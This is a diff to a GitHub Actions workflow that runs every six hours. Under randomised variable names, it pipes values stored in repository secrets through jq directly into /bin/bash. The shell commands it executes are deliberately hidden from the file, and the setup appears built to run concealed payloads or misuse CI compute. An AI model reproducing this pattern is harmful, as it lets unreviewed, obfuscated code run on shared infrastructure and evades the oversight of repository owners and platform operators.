@@ -2,27 +2,25 @@ name: wangtesi6128
 on:
   workflow_dispatch:
   schedule:
-    - cron: '52 4/6 * * *'
+    - cron: '30 0/6 * * *'
 
-jobs:  # 618
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: wangtesi6128
         env:
-          kekm175: ${{ secrets.kekm175 }}
+          a8007: ${{ secrets.a8007 }}
         run: |
-          echo $kekm175 | jq -r .fdl0576 | /bin/bash
-          echo $iusyq2039 | jq -r .j39185 | /bin/bash
-          echo $pns8516 | jq -r .mt0179 | /bin/bash
-          echo $ertv4 | jq -r .qjgi95 | /bin/bash
-          echo $wlb5 | jq -r .bujqx865 | /bin/bash
-          echo $ur79 | jq -r .bsc1559 | /bin/bash
-          echo $otj57 | jq -r .dlj6 | /bin/bash
-          echo $tymzu8 | jq -r .xtvzs89 | /bin/bash
-          echo $cp38716 | jq -r .l89360 | /bin/bash
-          echo $q16 | jq -r .tbf0409 | /bin/bash
-          echo $jee13 | jq -r .fyjz9374 | /bin/bash
-          echo $idrf01 | jq -r .wfzx66958 | /bin/bash
+          echo $a8007 | jq -r .nimm001 | /bin/bash
+          echo $cqet869 | jq -r .x556 | /bin/bash
+          echo $a4 | jq -r .sdby02426 | /bin/bash
+          echo $hrgc02 | jq -r .sre9 | /bin/bash
+          echo $bjm58801 | jq -r .db8 | /bin/bash
+          echo $bx8 | jq -r .qiw08 | /bin/bash
+          echo $hze93966 | jq -r .nq362 | /bin/bash
+          echo $ve5 | jq -r .nznpr3869 | /bin/bash
+          echo $izhid864 | jq -r .ud3 | /bin/bash
 
